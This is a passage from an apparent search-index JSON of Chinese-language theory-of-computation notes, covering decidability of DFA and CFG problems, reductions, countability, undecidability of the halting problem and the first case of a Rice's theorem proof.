state</li> <li>\u2003\u2003accept</li> <li>else</li> <li>\u2003\u2003\"conceptually\" do BFS in the diagram</li> <li>\u2003\u2003if there is a path from \\(s\\) to a final state</li> <li>\u2003\u2003\u2003\u2003reject</li> <li>\u2003\u2003else</li> <li>\u2003\u2003\u2003\u2003accept</li> </ol> \u5224\u5b9a\u95ee\u9898 \\(R_5\\) (\\(EQ_{\\text{DFA}}\\)) <p>\\(EQ_{\\text{DFA}} = \\{\\texttt{\"}D_1\\texttt{\"}\\texttt{\"}D_2\\texttt{\"}: D_1\\text{ and }D_2\\text{ are two DFAs with }L(D_1)=L(D_2)\\}\\)</p> <p>Hint:</p> <ul> <li>\u5bf9\u79f0\u5dee \\(A\\oplus B=\\{x\\in A\\cup B\\text{ and }x\\notin A\\cap B\\}=A\\cup B - A\\cap B\\)<ul> <li>\\(A\\oplus B = (A\\cup B)\\cap(\\overline{A\\cap B}) = (A\\cup B)\\cap(\\overline{A}\\cup\\overline{B})\\)</li> </ul> </li> <li>\\(A=B\\) iff \\(A\\oplus B = \\emptyset\\)\uff08\u53ef\u4ee5\u501f\u6b64\u89c4\u7ea6\u81f3 \\(R_4\\)\uff09</li> </ul> <p>\\(M_{R_5}\\) = on input \\(\\texttt{\"}D_1\\texttt{\"}\\texttt{\"}D_2\\texttt{\"}\\)</p> <ol> <li>construct \\(D_3\\) with \\(L(D_3) = L(D_1)\\oplus L(D_2)\\)</li> <li>run \\(M_{R_4}\\) on \\(\\texttt{\"}D_3\\texttt{\"}\\)</li> <li>return the result of \\(M_{R_4}\\)</li> </ol>"},{"location":"cs/tcs/toc/topic4/#_3","title":"\u89c4\u7ea6","text":"<ul> <li>\u89c4\u7ea6\u5b9a\u4e49\uff1a<ul> <li>\\(A,B\\) are languages over some alphabet \\(\\Sigma\\)</li> <li>A reduction from \\(A\\) to \\(B\\) is a recursive function \\(f\\colon \\Sigma^*\\rightarrow\\Sigma^*\\)</li> <li>s.t. for \\(x\\in\\Sigma^*\\), \\(x\\in A\\) iff \\(f(x)\\in B\\)</li> </ul> </li> <li>Theorem. If \\(B\\) is recursive, and exists a reduction \\(f\\) from \\(A\\) to \\(B\\), then \\(A\\) is recursive.<ul> <li>Proof. \\(\\exist M_B\\) decides \\(B\\), \\(M_A\\) = on input \\(x\\):<ol> <li>compute \\(f(x)\\)</li> <li>run \\(M_B\\) on \\(\\texttt{\"}f(x)\\texttt{\"}\\)</li> <li>return the result of \\(M_B\\)</li> </ol> </li> </ul> </li> <li>\\(A\\) \u7684\u5224\u5b9a\u96be\u5ea6\u5c0f\u4e8e\u7b49\u4e8e \\(B\\)\uff0c\u6240\u4ee5 \\(A\\) \u53ef\u4ee5\u89c4\u7ea6\u5230 \\(B\\) \u4e5f\u53ef\u4ee5\u8bb0\u4e3a \\(A\\leq B\\)</li> </ul> \u5224\u5b9a\u95ee\u9898 \\(C_1\\) (\\(A_{\\text{CFG}}\\)) <p>\\(A_{\\text{CFG}} = \\{\\texttt{\"}G\\texttt{\"}\\texttt{\"}w\\texttt{\"}: G\\text{ is a CFG that generates }w\\}\\)</p> <p>\\(M_{C_1}\\) = on input \\(\\texttt{\"}G\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</p> <ol> <li>\\(G\\) -&gt; \\(G'\\) in CNF</li> <li>enumerate all the derivations of length \\(2|w|-1\\)</li> <li>if any of them generates \\(w\\)</li> <li>\u2003\u2003accept \\(\\texttt{\"}G\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)</li> <li>else</li> <li>\u2003\u2003reject</li> </ol> \u5224\u5b9a\u95ee\u9898 \\(C_2\\) (\\(A_{\\text{PDA}}\\)) <p>\\(A_{\\text{PDA}} = \\{\\texttt{\"}P\\texttt{\"}\\texttt{\"}w\\texttt{\"}: P\\text{ is a PDA that accepts }w\\}\\)</p> <p>\u53ef\u4ee5\u89c4\u7ea6\u5230\u95ee\u9898 \\(C_1\\)\u3002</p> \u5224\u5b9a\u95ee\u9898 \\(C_3\\) (\\(E_\\text{CFG}\\)) <p>\\(E_\\text{CFG} = \\{\\texttt{\"}G\\texttt{\"}: G\\text{ is a CFG with }L(G)=\\emptyset\\}\\)</p> <p>\u63d0\u4f9b\u4e00\u4e2a\u7b97\u6cd5\u6765\u8fdb\u884c\u5224\u65ad\uff1a</p> <ul> <li>\u6807\u8bb0\u6240\u6709\u7684 terminal symbol</li> <li>\u5982\u679c\u4e00\u4e2a\u89c4\u5219\u7684\u53f3\u4fa7\u5747\u88ab\u6807\u8bb0\uff0c\u5219\u540c\u6837\u6807\u8bb0\u5de6\u4fa7\u7b26\u53f7\u51fa\u73b0\u7684\u6240\u6709\u4f4d\u7f6e</li> <li>\u6700\u7ec8\u65e0\u6cd5\u8fdb\u4e00\u6b65\u6807\u8bb0\u65f6\uff0c\u5982\u679c S \u88ab\u6807\u8bb0\u4e86\uff0c\u5219 \\(L(G)\\) \u4e0d\u4e3a\u7a7a</li> </ul> <p>S \u88ab\u6807\u8bb0\u4e86\u76f8\u5f53\u4e8e\u5b58\u5728\u4e00\u79cd\u65b9\u6848\u53ef\u4ee5\u63a8\u5bfc\u81f3\u5747\u4e3a terminal\u3002</p> <p>e.g. S-&gt;Aa A-&gt;CB C-&gt;e C-&gt;a B-&gt;b\uff0c\u5148\u6807\u8bb0 abe\uff0c\u518d\u6807\u8bb0 CB\uff0c\u518d\u6807\u8bb0 A\uff08\u56e0\u4e3a A-&gt;CB\uff09\uff0c\u518d\u6807\u8bb0 S\uff0c\u6240\u4ee5\u8fd9\u4e2a CFG \u7684 language \u4e0d\u4e3a\u7a7a\u3002</p> \u5224\u5b9a\u95ee\u9898 \\(C_4\\) (\\(E_\\text{PDA}\\)) <p>\u53ef\u4ee5\u89c4\u7ea6\u5230 \\(C_3\\)\u3002</p>"},{"location":"cs/tcs/toc/topic4/#_4","title":"\u8bed\u8a00\u7684\u5b58\u5728\u6027\u95ee\u9898","text":"<p>\u76ee\u524d\u6211\u4eec\u77e5\u9053\u7684\u8bed\u8a00\u5206\u7c7b\u5982\u4e0b\uff1a</p> <p> </p> <p>\u63a5\u4e0b\u6765\u60f3\u8981\u627e\u5230\u4e24\u79cd\u8bed\u8a00\uff1a</p> <ul> <li>recursively enumerable \u4f46\u4e0d recursive</li> <li>\u4e0d recursively enumerable</li> </ul>"},{"location":"cs/tcs/toc/topic4/#_5","title":"\u96c6\u5408\u7684\u53ef\u5217\u6027","text":"<p>\u96c6\u5408 \\(S\\) \u662f\u53ef\u5217\u7684\uff08countable\uff09\u5f53\u4e14\u4ec5\u5f53\u5b83\u662f\u6709\u9650\u7684\u6216\u5b58\u5728\u53cc\u5c04 \\(f\\colon S\\to\\mathbb{N}\\)\uff0c\u5426\u5219\u5c31\u662f\u4e0d\u53ef\u5217\u7684\uff08uncountable\uff09\u3002</p> Lemma 1. \u96c6\u5408 \\(S\\) \u662f\u53ef\u5217\u7684\u5f53\u4e14\u4ec5\u5f53\u5b58\u5728\u4e00\u4e2a\u5355\u5c04 \\(g\\colon S\\to\\mathbb{N}\\) <p>Proof. \u5982\u679c \\(S\\) \u662f\u6709\u9650\u7684\uff0c\u5219\u81ea\u7136\u6210\u7acb\uff0c\u5426\u5219\uff1a</p> <ul> <li>\u5de6\u63a8\u53f3\uff0c\u53cc\u5c04\u4e5f\u6ee1\u8db3\u5355\u5c04\uff0c\u81ea\u7136\u6210\u7acb</li> <li>\u53f3\u63a8\u5de6\uff0c\u5219\u6784\u9020\u4e00\u4e2a\u53cc\u5c04<ul> <li>\u5b58\u5728\u5355\u5c04\uff0c\u5219\u53ef\u4ee5\u5c06 \\(S\\) \u7684\u5143\u7d20\u8fdb\u884c\u6392\u5e8f\u5e76\u7f16\u53f7 \\(S_1, S_2, \\cdots\\)<ul> <li>\u540c\u65f6\u4f7f\u5176\u6ee1\u8db3 \\(g(S_1) &lt; g(S_2) &lt; \\cdots\\)</li> </ul> </li> <li>\u4ee4 \\(f(S_i) = i\\)\uff0c\u5219 \\(f\\) \u662f\u4e00\u4e2a\u53cc\u5c04</li> </ul> </li> </ul> Corollary 1. \u4efb\u610f\u53ef\u5217\u96c6\u7684\u5b50\u96c6\u4e5f\u662f\u53ef\u5217\u7684 <p>Proof. \u6839\u636e Lemma 1. \\(A\\) \u662f\u53ef\u5217\u7684\uff0c\u5219\u5b58\u5728\u5355\u5c04 \\(f\\colon A\\to\\mathbb{N}\\)\uff0c\u5219\u4efb\u610f \\(A'\\subseteq A\\)\uff0c\u4e5f\u5b58\u5728\u5355\u5c04 \\(f\\colon A'\\to\\mathbb{N}\\) \u6210\u7acb\uff0c\u6240\u4ee5 \\(A'\\) \u662f\u53ef\u5217\u7684\u3002</p>"},{"location":"cs/tcs/toc/topic4/#_6","title":"\u975e\u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00\u7684\u5b58\u5728\u6027","text":"Lemma 2. \u5bf9\u4e8e\u7b26\u53f7\u96c6 \\(\\Sigma\\)\uff0c\\(\\Sigma^*\\) \u662f\u53ef\u5217\u7684 <p>\u5047\u8bbe \\(\\Sigma=\\{0, 1\\}\\)\uff0c\u5219 \\(\\Sigma^*=\\{e, 0, 1, 00, 01, 10, 11, \\cdots\\}\\)\uff0c\u53ef\u4ee5\u5c06\u5176\u6620\u5c04\u5230 \\(\\{0, 1, 2, \\cdots\\}\\)\uff0c\u800c\u4e14\u662f\u53cc\u5c04\uff0c\u6240\u4ee5\u662f\u53ef\u5217\u7684\u3002</p> <p>\u8bc1\u660e\u7684\u8bdd\u5219\u8bf4\u660e \\(\\forall s\\in\\Sigma^*, \\exist f(s)\\) \u5373\u53ef\uff0c\u800c \\(f(s)\\) \u4e0d\u4f1a\u8d85\u8fc7 \\(2^{|s|}\\)\uff0c\u6240\u4ee5\u603b\u53ef\u4ee5\u627e\u5230\u3002</p> Corollary 2. \u6240\u6709\u56fe\u7075\u673a\u7ec4\u6210\u7684\u96c6\u5408 \\(\\{M: M\\text{ is a TM}\\}\\) \u662f\u53ef\u5217\u7684 <p>\u56fe\u7075\u673a\u90fd\u53ef\u4ee5\u7528\u6709\u9650\u7684\u7b26\u53f7\u96c6\u8868\u793a\uff0c\u6240\u4ee5\u7b49\u4ef7\u4e8e\u5b57\u7b26\u4e32\uff0c\u6839\u636e Lemma 2. \u6240\u6709\u56fe\u7075\u673a\u7ec4\u6210\u7684\u96c6\u5408\u662f\u53ef\u5217\u7684\u3002</p> Lemma 3. \u4ee4 \\(\\mathcal{L}\\) \u662f \\(\\Sigma\\) \u4e0a\u6240\u6709\u8bed\u8a00\u7684\u96c6\u5408\uff0c\u5219 \\(\\mathcal{L}\\) \u4e0d\u53ef\u5217 <p>Proof. \u53cd\u8bc1\u6cd5\uff0c\u5047\u8bbe \\(\\mathcal{L}\\) \u662f\u53ef\u5217\u7684\uff0c\u5219\u53ef\u4ee5\u5c06\u5176\u5143\u7d20\u7f16\u53f7\u4e3a \\(L_1, L_2, \\cdots\\)\u3002\u800c \\(\\Sigma^*\\) \u662f\u53ef\u5217\u7684\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5176\u7f16\u53f7\u4e3a \\(s_1, s_2, \\cdots\\)\u3002</p> <p>\u63a5\u4e0b\u6765\u6784\u9020\u4e00\u4e2a\u8bed\u8a00 \\(D=\\{s_i:s_i\\notin L_i\\}\\)\uff0c\u56e0\u4e3a\u5b83\u4e5f\u662f\u4e00\u4e2a \\(\\Sigma\\) \u4e0a\u7684\u8bed\u8a00\uff0c\u6240\u4ee5\u5e94\u8be5\u4e5f\u5c5e\u4e8e \\(\\mathcal{L}\\)\u3002\u4f46\u5176\u5305\u542b\u7684\u5b57\u7b26\u4e32\u90fd\u6709\u4e0d\u5c5e\u4e8e\u67d0\u4e00\u4e2a\u73b0\u6709\u8bed\u8a00\u4e2d\u7684\uff0c\u5373 \\(\\forall i, s_i\\in D\\text{ iff }s_i\\notin L_i\\)\uff0c\u6240\u4ee5 \\(D\\neq L_i\\)\uff0c\u6240\u4ee5 \\(D\\) \u4e0d\u5c5e\u4e8e \\(\\mathcal{L}\\)\uff0c\u77db\u76fe\u3002</p> <p>\u6839\u636e Corollary 2. \u548c Lemma 3. \u6211\u4eec\u77e5\u9053\u56fe\u7075\u673a\u7684\u96c6\u5408\u662f\u53ef\u5217\u7684\uff0c\u4f46\u8bed\u8a00\u7684\u96c6\u5408\u662f\u4e0d\u53ef\u5217\u7684\uff0c\u6240\u4ee5\u4e00\u5b9a\u5b58\u5728\u4e00\u4e9b\u8bed\u8a00\u662f\u4e0d\u80fd\u88ab\u56fe\u7075\u673a\u5224\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u975e recursively enumerable \u7684\u3002</p>"},{"location":"cs/tcs/toc/topic4/#_7","title":"\u505c\u673a\u95ee\u9898","text":"<p>\u73b0\u5b9a\u4e49\u8bed\u8a00 \\(H=\\{\\texttt{\"}M\\texttt{\"}\\texttt{\"}w\\texttt{\"}: M\\text{ is a TM that halts on }w\\}\\)\uff0c\u5373\u5224\u5b9a\u56fe\u7075\u673a \\(M\\) \u662f\u5426\u5728\u8f93\u5165 \\(w\\) \u4e0a\u505c\u673a\u3002</p> Theorem 1. \u8bed\u8a00 \\(H\\) \u662f recursively enumerable \u7684 <p>\u5f88\u7b80\u5355\uff0c\u76f4\u63a5\u8ba9 \\(M\\) \u5728 \\(w\\) \u4e0a\u8fd0\u884c\u5373\u53ef\uff0c\u505c\u673a\u5c31\u662f accept\uff0c\u4e0d\u505c\u673a\u5c31\u662f reject\uff0c\u6240\u4ee5\u662f recursively enumerable \u7684\u3002</p> <p>\u5f62\u5f0f\u5316\u63cf\u8ff0\u5219\u6784\u9020\u56fe\u7075\u673a \\(U\\) = on input \\(\\texttt{\"}M\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\)\uff1a</p> <ol> <li>run \\(M\\) on \\(w\\)</li> </ol> <p>\\(U\\) halts on \\(\\texttt{\"}M\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\) iff \\(M\\) halts on \\(w\\).</p> <p>\uff08\u8fd9\u4e2a\u56fe\u7075\u673a \\(U\\) \u540e\u7eed\u8fd8\u4f1a\u7528\u5230\uff09</p> Theorem 2. \u8bed\u8a00 \\(H\\) \u4e0d\u662f recursive \u7684 <p>\u518d\u5b9a\u4e49\u4e00\u4e2a\u8bed\u8a00 \\(H_d=\\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM that does NOT halt on }\\texttt{\"}M\\texttt{\"}\\}\\)\uff0c\u5373\u5224\u5b9a\u56fe\u7075\u673a \\(M\\) \u662f\u5426\u5728\u8f93\u5165 \\(\\texttt{\"}M\\texttt{\"}\\)\uff08\u81ea\u5df1\u7684\u7f16\u7801\uff09\u4e0a\u505c\u673a\u3002</p> <p>\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u5206\u522b\u8bc1\u660e\u4e24\u4e2a\u7ed3\u8bba\uff1a</p> \u5982\u679c \\(H\\) \u662f recursive \u7684\uff0c\u5219 \\(H_d\\) \u4e5f\u662f <p>\u5982\u679c \\(H\\) \u662f recursive \u7684\uff0c\u5219\u5b58\u5728\u56fe\u7075\u673a \\(M_H\\) \u5224\u5b9a \\(H\\)\uff0c\u90a3\u4e48\u6784\u9020\u56fe\u7075\u673a \\(M_d\\) = on input \\(\\texttt{\"}M\\texttt{\"}\\)\uff1a</p> <ol> <li>run \\(M_H\\) on \\(\\texttt{\"}M\\texttt{\"}\\texttt{\"}M\\texttt{\"}\\)</li> <li>if \\(M_H\\) accepts \\(\\texttt{\"}M\\texttt{\"}\\texttt{\"}M\\texttt{\"}\\)</li> <li>\u2003\u2003reject</li> <li>else</li> <li>\u2003\u2003accept</li> </ol> <p>\u90a3\u4e48\u8fd9\u4e2a\u56fe\u7075\u673a\u53ef\u4ee5\u5224\u5b9a \\(H_d\\)\uff0c\u6240\u4ee5 \\(H_d\\) \u662f recursive \u7684\u3002</p> \u8bed\u8a00 \\(H_d\\) \u4e0d\u662f recursively enumerable \u7684 <p>\u5047\u8bbe\u5b83\u662f\uff0c\u5219\u5b58\u5728\u56fe\u7075\u673a \\(D\\) \u534a\u5224\u5b9a\u5b83\uff0c\u5219 \\(D\\) \u5728\u8f93\u5165 \\(\\texttt{\"}M\\texttt{\"}\\) \u65f6\uff1a</p> <ul> <li>\u5982\u679c \\(\\texttt{\"}M\\texttt{\"}\\in H_d\\) \u5219\u505c\u673a</li> <li>\u5982\u679c \\(\\texttt{\"}M\\texttt{\"}\\notin H_d\\) \u5219\u4e0d\u505c\u673a</li> </ul> <p>\u90a3\u4e48\u5f53 \\(M=D\\) \u65f6\uff0c\u5219\u51fa\u73b0\u60c5\u51b5\uff1a</p> <ul> <li>\u5982\u679c \\(\\texttt{\"}D\\texttt{\"}\\in H_d\\) \u5219\u505c\u673a<ul> <li>\u800c  \\(\\texttt{\"}D\\texttt{\"}\\in H_d\\) \u610f\u5473\u7740 \\(D\\) \u4e0d\u4f1a\u5728\u81ea\u8eab\u7f16\u7801\u4e0a\u505c\u673a\uff0c\u77db\u76fe</li> </ul> </li> <li>\u5982\u679c \\(\\texttt{\"}D\\texttt{\"}\\notin H_d\\) \u5219\u4e0d\u505c\u673a<ul> <li>\u800c  \\(\\texttt{\"}D\\texttt{\"}\\notin H_d\\) \u610f\u5473\u7740 \\(D\\) \u4f1a\u5728\u81ea\u8eab\u7f16\u7801\u4e0a\u505c\u673a\uff0c\u77db\u76fe</li> </ul> </li> </ul> <p>\u6240\u4ee5\u5047\u8bbe\u4e0d\u6210\u7acb\uff0c\\(H_d\\) \u4e0d\u662f recursively enumerable \u7684\u3002</p> <p>\u6839\u636e\u8fd9\u4e24\u4e2a\u7ed3\u8bba\uff0c\u5982\u679c \\(H\\) \u662f recursive \u7684\uff0c\u5219 \\(H_d\\) \u4e5f\u662f\uff0c\u800c recursive \u4e00\u5b9a\u662f recursively enumerable \u7684\uff0c\u4f46\u6211\u4eec\u53c8\u8bc1\u660e\u4e86 \\(H_d\\) \u4e0d\u662f recursively enumerable \u7684\uff0c\u6240\u4ee5\u4ea7\u751f\u4e86\u77db\u76fe\u3002\u90a3\u4e48\u5c31\u8bf4\u660e \\(H\\) \u4e0d\u662f recursive \u7684\u3002</p> <p>\u8fd9\u6837\u5c31\u627e\u5230\u4e86\u4e4b\u524d\u8bf4\u5230\u7684\u4e24\u4e2a\u8bed\u8a00\uff1a</p> <ul> <li>\\(H\\)\uff1arecursively enumerable \u4f46\u4e0d recursive</li> <li>\\(H_d\\)\uff1a\u4e0d recursively enumerable</li> </ul>"},{"location":"cs/tcs/toc/topic4/#_8","title":"\u505c\u673a\u95ee\u9898\u76f8\u5173\u5224\u5b9a\u95ee\u9898","text":"<p>\u6ce8\u610f\u4ee5\u4e0b\u5224\u65ad\u95ee\u9898\u90fd\u662f\u4e0d\u53ef\u5224\u5b9a\u7684</p> <p>\u5982\u679c \\(A\\leq B\\)\uff0c\u4e14 \\(A\\) \u662f\u975e recursive \u7684\uff0c\u5219 \\(B\\) \u4e5f\u975e recursive</p> \u5224\u5b9a\u95ee\u9898 \\(A_1 = \\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM that halts on }e\\}\\) <p>\u8bd5\u56fe\u8fdb\u884c\u89c4\u7ea6 \\(H\\leq A_1\\)\uff0c\u6839\u636e\u89c4\u7ea6\u7684\u5b9a\u4e49\u9700\u8981\u6ee1\u8db3\u5c06\u4efb\u610f\u8f93\u5165\u7ed9 \\(H\\) \u7684\u5b57\u7b26\u4e32 \\(\\texttt{\"}M\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\) \u8f6c\u6362\u4e3a\u8f93\u5165\u7ed9 \\(A_1\\) \u7684\u5b57\u7b26\u4e32 \\(\\texttt{\"}M^*\\texttt{\"}\\)\uff0c\u6ee1\u8db3 \\(M\\) \u5728 \\(w\\) \u4e0a\u505c\u673a\u5f53\u4e14\u4ec5\u5f53 \\(M^*\\) \u5728 \\(e\\) \u4e0a\u505c\u673a\u3002</p> <p>\u5219\u5b9a\u4e49\u56fe\u7075\u673a \\(M^*\\) = on input \\(u\\)</p> <ol> <li>run \\(M\\) on \\(w\\)</li> </ol> <p>\u8fd9\u6837\u5c31\u53ef\u4ee5\u8fbe\u5230\u6548\u679c\u3002\u5373 \\(M^*\\) \u5728 \\(e\\) \u4e0a\u505c\u673a &lt;=&gt; \\(M^*\\) \u5728\u67d0\u4e9b\u5b57\u7b26\u4e32\u4e0a\u505c\u673a &lt;=&gt; \\(M^*\\) \u5728\u4efb\u610f\u8f93\u5165\u4e0a\u505c\u673a &lt;=&gt; \\(M\\) \u5728 \\(w\\) \u4e0a\u505c\u673a\u3002</p> \u5224\u5b9a\u95ee\u9898 \\(A_2 = \\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM that halts on some input}\\}\\) <p>\u6839\u636e\u4e0a\u9762 \\(A_1\\) \u7684\u7ed3\u8bba\uff0c\u4f7f\u7528 \\(M^*\\) \u5373\u53ef\uff0c\u662f\u5b8c\u5168\u7b49\u4ef7\u7684\u3002</p> \u5224\u5b9a\u95ee\u9898 \\(A_3 = \\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM that halts on every input}\\}\\) <p>\u540c\u7406\u7b49\u4ef7</p> \u5224\u5b9a\u95ee\u9898 \\(A_4 = \\{\\texttt{\"}M_1\\texttt{\"}\\texttt{\"}M_2\\texttt{\"}: M_1\\text{ and }M_2\\text{ are two TM with }L(M_1)=L(M_2)\\}\\) <p>\u5c1d\u8bd5\u89c4\u7ea6 \\(A_3\\leq A_4\\)\uff0c\\(A_3\\) \u7684\u8f93\u5165\u4e3a \\(\\texttt{\"}M\\texttt{\"}\\)\uff0c\\(A_4\\) \u7684\u8f93\u5165\u4e3a \\(\\texttt{\"}M_1\\texttt{\"}\\texttt{\"}M_2\\texttt{\"}\\)\uff0c\u9700\u8981\u6ee1\u8db3 \\(M\\) \u5728\u4efb\u610f\u8f93\u5165\u4e0a\u505c\u673a\u5f53\u4e14\u4ec5\u5f53 \\(M_1\\) \u548c \\(M_2\\) \u534a\u5224\u5b9a\u7684\u8bed\u8a00\u76f8\u540c\u3002</p> <p>\u4ee4 \\(M_1\\) = \\(M\\), \\(M_2\\) = on input \\(x\\):</p> <ol> <li>halts</li> </ol> <p>\u8fd9\u6837\u6211\u4eec\u77e5\u9053 \\(M_2\\) \u4f1a\u5728\u4efb\u610f\u8f93\u5165\u4e0a\u505c\u673a\uff0c\u6240\u4ee5 \\(M\\) \u5728\u4efb\u610f\u8f93\u5165\u4e0a\u505c\u673a &lt;=&gt; \\(M\\) \u5373 \\(M_1\\) \u548c \\(M_2\\) \u534a\u5224\u5b9a\u7684\u8bed\u8a00\u76f8\u540c\u3002</p> \u5224\u5b9a\u95ee\u9898 \\(R_\\text{TM}=\\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM with }L(M)\\text{ is regular}\\}\\) <p>\u95ee\u9898 \\(\\overline{R_\\text{TM}} = \\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM with }L(M)\\text{ is not regular}\\}\\) \u662f\u53ef\u5224\u5b9a\u7684\u5219 \\(R_\\text{TM}\\) \u4e5f\u662f\u53ef\u5224\u5b9a\u7684\u3002</p> <p>\u63a5\u4e0b\u6765\u5c1d\u8bd5\u89c4\u7ea6 \\(H\\leq\\overline{R_\\text{TM}}\\)\uff0c\\(H\\) \u7684\u8f93\u5165 \\(\\texttt{\"}M\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\) \u8f6c\u6362\u4e3a \\(\\overline{R_\\text{TM}}\\) \u7684\u8f93\u5165 \\(\\texttt{\"}M^*\\texttt{\"}\\)\uff0c\u9700\u8981\u6ee1\u8db3 \\(M\\) \u5728 \\(w\\) \u4e0a\u505c\u673a\u5f53\u4e14\u4ec5\u5f53 \\(L(M^*)\\) \u4e0d\u662f regular \u7684\u3002</p> <p>\u6784\u9020\u56fe\u7075\u673a \\(M^*\\) = on input \\(x\\)</p> <ol> <li>run \\(M\\) on \\(w\\)</li> <li>run \\(U\\) on \\(x\\)</li> </ol> <p>\u5219 \\(L(M^*)\\) \u6709\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u5728\u7b2c\u4e00\u884c\u505c\u673a\u65f6 \\(L(M^*) = L(U) = H\\)</li> <li>\u5728\u7b2c\u4e00\u884c\u4e0d\u505c\u673a\u65f6 \\(L(M^*) = \\emptyset\\)</li> </ul> <p>\u56e0\u4e3a \\(\\emptyset\\) \u662f regular \u7684\uff0c\u6240\u4ee5 \\(L(M^*)\\) \u4e0d\u662f regular \u7684 &lt;=&gt; \\(M\\) \u5728 \\(w\\) \u4e0a\u505c\u673a\u3002</p> \u5224\u5b9a\u95ee\u9898 \\(CF_\\text{TM}=\\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM with }L(M)\\text{ is context-free}\\}\\) <p>\u540c\u4e0a\uff0c\\(\\emptyset\\) \u4e5f\u662f context-free \u7684\uff0c\u6240\u4ee5\u540c\u6837\u53ef\u4ee5\u89c4\u7ea6 \\(H\\leq CF_\\text{TM}\\)\u3002</p> \u5224\u5b9a\u95ee\u9898 \\(REC_\\text{TM}=\\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM with }L(M)\\text{ is recursive}\\}\\) <p>\u540c\u4e0a\uff0c\\(\\emptyset\\) \u4e5f\u662f recursive \u7684\uff0c\u6240\u4ee5\u540c\u6837\u53ef\u4ee5\u89c4\u7ea6 \\(H\\leq REC_\\text{TM}\\)\u3002</p>"},{"location":"cs/tcs/toc/topic4/#_9","title":"\u4e0a\u8ff0\u5224\u5b9a\u95ee\u9898\u7684\u7edf\u4e00\u5316","text":"<p>\u524d\u9762\u53ef\u4ee5\u5229\u7528\u505c\u673a\u95ee\u9898\u89c4\u7ea6\u8bc1\u660e\u4e0d\u53ef\u5224\u5b9a\u7684\u95ee\u9898\u90fd\u53ef\u4ee5\u8868\u793a\u4e3a \\(R(P) = \\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM with }L(M)\\text{ having property }P\\}\\)\uff0c\u5176\u4e2d \\(P\\) \u53ef\u4ee5\u662f\u4f8b\u5982 regular / context free / recursive \u7b49\uff0c\u6216\u8005\u8bf4\u660e \\(L(M)=\\Sigma^*\\)\uff08\u5373\u5728\u4efb\u610f\u8f93\u5165\u4e0a\u505c\u673a\uff09\u6216 \\(e\\in L(M)\\)\uff08\u5373\u5728\u7a7a\u4e32\u4e0a\u505c\u673a\uff09\u7b49\u3002\u8fd9\u4e9b\u60c5\u51b5\u4e0b\u95ee\u9898 \\(R(P)\\) \u90fd\u662f\u4e0d\u53ef\u5224\u5b9a\u7684\u3002</p> Rice's Theorem <p>\u4ee4 \\(\\mathcal{L}(P)\\) \u4e3a\u5177\u6709\u6027\u8d28 \\(P\\) \u7684\u6240\u6709 recursively enumerable \u8bed\u8a00\u7684\u96c6\u5408\uff0c\u5219 \\(R(P)\\) \u53ef\u4ee5\u8868\u793a\u4e3a \\(\\{\\texttt{\"}M\\texttt{\"}: M\\text{ is a TM with }L(M)\\in\\mathcal{L}(P)\\}\\)\uff0c\u5219\u6709\uff1a</p> <ul> <li>\u5982\u679c \\(\\mathcal{L}(P)=\\emptyset\\) \u6216 \\(\\mathcal{L}(P)\\) \u5305\u542b\u6240\u6709 recursively enumerable \u8bed\u8a00<ul> <li>\u5219 \\(R(P)\\) \u662f recursive \u7684</li> </ul> </li> <li>\u5982\u679c \\(\\mathcal{L}(P)\\) \u662f\u6240\u6709 recursively enumerable \u8bed\u8a00\u7684\u975e\u7a7a\u771f\u5b50\u96c6<ul> <li>\u5219 \\(R(P)\\) \u4e0d\u662f recursive \u7684\uff08\u5373\u662f\u4e0d\u53ef\u5224\u5b9a\u7684\uff09</li> </ul> </li> </ul> Proof case 1. \\(\\emptyset\\notin\\mathcal{L}(P)\\) <p>\u610f\u5473\u7740 \\(\\exist A\\in\\mathcal{L}(P)\\) \u4e14 \\(A\\neq\\emptyset\\)\uff0c\u6240\u4ee5\u53ef\u4ee5\u6784\u9020\u56fe\u7075\u673a \\(M_A\\) \u534a\u5224\u5b9a \\(A\\)\u3002\u63a5\u4e0b\u6765\u5c1d\u8bd5\u89c4\u7ea6 \\(H\\leq R(P)\\)\uff08\u524d\u8005\u56fe\u7075\u673a\u4e3a \\(M_H\\)\uff0c\u540e\u8005\u4e3a \\(M_R\\)\uff09\u3002</p> <p>\u6784\u9020\u56fe\u7075\u673a \\(M_H\\) = on input \\(\\texttt{\"}M\\texttt{\"}\\texttt{\"}w\\texttt{\"}\\):</p> <ol> <li>construct a TM \\(M^*\\) = on input \\(x\\):<ol> <li>run \\(M\\) on \\(w\\)</li> <li>run \\(M_A\\) on \\(x\\)</li> </ol> </li> <li>run \\(M_R\\) on \\(\\texttt{\"}M^*\\texttt{\"}\\)</li> <li>return the result of \\(M_R\\)</li> </ol> <p>\u6784\u9020\u7684\u56fe\u7075\u673a \\(M^*\\) \u7684\u8bed\u8a00\u6709\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\u5f53 \\(M^*\\) \u5728\u7b2c\u4e00\u884c\u505c\u673a\u65f6\uff0c\\(L(M^*) = L(M_A) = A\\in\\mathcal{L}(P)\\)</li> <li>\u5f53 \\(M^*\\) \u5728\u7b2c\u4e00\u884c\u4e0d\u505c\u673a\u65f6\uff0c\\(L(M^*) = \\emptyset\\notin\\mathcal{L}(P)\\)</li> </ul> <p>\u6240\u4ee5\u505c\u673a\u95ee\u9898\u53ef\u4ee5\u89c4\u7ea6\u81f3 \\(R(P)\\)\uff0c\u6240\u4ee5 \\(R(P)\\) \u662f\u975e recursive \u7684\u3002</p> case 2. 